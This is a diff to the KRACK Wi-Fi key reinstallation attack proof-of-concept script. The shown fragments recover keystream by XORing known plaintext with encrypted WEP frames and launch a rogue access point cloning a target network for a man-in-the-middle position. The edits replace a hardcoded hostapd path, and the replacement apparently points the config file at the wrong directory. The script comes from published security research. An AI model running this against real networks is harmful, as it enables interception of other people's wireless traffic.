@@ -323,7 +323,6 @@ class KRAckAttack():
 		if p.haslayer(Dot11WEP) or p.haslayer(Dot11CCMP):
 			if p.haslayer(Dot11WEP):
 				plaintext = "\xaa\xaa\x03\x00\x00\x00"
-				# Note that scapy incorrectly puts Extended IV into wepdata field, so skip those four bytes
 				encrypted = p[Dot11WEP].wepdata[4:4+len(plaintext)]
 				keystream = xorstr(plaintext, encrypted)
 			else:
@@ -628,8 +627,8 @@ class KRAckAttack():
 		# Set up a rogue AP that clones the target network (don't use tempfile - it can be useful to manually use the generated config)
 		with open(os.path.realpath(os.path.join(self.script_path, "../hostapd/hostapd_rogue.conf")), "w") as fp:
 			fp.write(self.netconfig.write_config(self.nic_rogue_ap))
-		# hostapd_path = os.path.realpath((os.path.join(self.script_path, "../hostapd/hostapd")) + ' ' + os.path.realpath(os.path.join(self.script_path, "hostapd_rogue.conf")) + " -dd" + " -K")
-		self.hostapd = subprocess.Popen("/home/sun10/krackattacks-poc-zerokey/hostapd/hostapd /home/sun10/krackattacks-poc-zerokey/hostapd/hostapd_rogue.conf -dd -K", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+		hostapd_path = os.path.realpath((os.path.join(self.script_path, "../hostapd/hostapd")) + ' ' + os.path.realpath(os.path.join(self.script_path, "hostapd_rogue.conf")) + " -dd" + " -K")
+		self.hostapd = subprocess.Popen(hostapd_path, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
 		self.hostapd_log = open("hostapd_rogue.log", "w")
 		
 		log(STATUS, "Giving the rogue hostapd one second to initialize ...")
@@ -712,7 +711,7 @@ def cleanup():
 
 if __name__ == "__main__":
 	description = textwrap.dedent(
-		"""\
+		"""
 		Key Reinstallation Attacks (KRACKs) by Mathy Vanhoef
 		-----------------------------------------------------------
 		  - Uses CSA beacons to obtain channel-based MitM position
